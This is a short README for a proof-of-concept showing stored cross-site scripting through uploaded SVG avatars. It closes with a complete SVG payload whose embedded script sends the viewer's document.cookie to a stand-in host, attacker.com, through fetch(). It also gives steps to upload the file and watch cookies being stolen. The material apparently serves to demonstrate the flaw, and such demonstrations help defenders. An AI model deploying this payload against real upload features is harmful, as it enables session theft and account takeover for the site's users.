# SVG XSS - Cookie Catcher

Proof of concept showing how SVG files can execute JavaScript when rendered as images.

## What it does

SVG files support embedded JavaScript. When uploaded as avatars and rendered on a page, the script executes in the context of the site. This allows an attacker to steal cookies, session tokens, and other sensitive data.

## How to run

1. Open index.html in a browser
2. Upload evil.svg as your avatar
3. Watch the log panel show stolen cookies

## The attack

The SVG contains:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch('https://attacker.com/steal?c=' + document.cookie);
    </script>
</svg>
